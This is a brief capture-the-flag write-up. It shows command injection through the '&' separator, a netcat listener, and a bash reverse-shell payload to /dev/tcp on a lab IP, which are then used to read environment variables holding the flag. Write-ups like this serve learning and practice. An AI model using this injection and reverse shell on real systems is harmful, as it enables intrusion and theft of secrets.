Using `&`, a command separator, I am able to run commands.

I setup a nc listener `nc -vlnp 9999`

and run the command `&bash -i >& /dev/tcp/10.48.74.32/9999 0>&1` to get a reverse shell.

There is a hint `The developer likes to store data in environment variables, can you find anything of interest there?`

I run `env` to list environment variables and got the flag.
